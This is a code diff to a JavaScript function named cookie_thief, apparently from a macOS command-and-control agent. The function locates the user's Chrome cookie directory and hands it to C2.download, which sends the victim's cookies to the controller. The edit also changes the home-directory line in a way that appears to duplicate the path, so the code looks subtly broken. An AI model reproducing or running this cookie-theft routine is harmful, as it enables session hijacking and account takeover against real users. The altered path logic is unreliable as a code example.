@@ -20,14 +20,17 @@ exports.cookie_thief = function(task, command, params){
     else {
         username = $.NSUserName().js;
     }
-    homedir = homedir += username + "/";
+    homedir += homedir + username + "/";
 
     if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
     if(browser == "chrome") {
         cookiedir = chromeCookieDir;
     }
     cookieDLPath = homedir + cookiedir;
+
+    //DEBUG
     console.log(cookieDLPath)
+
     try{
         let status = C2.download(task, cookieDLPath);
     	  if(status.hasOwnProperty("file_id")){
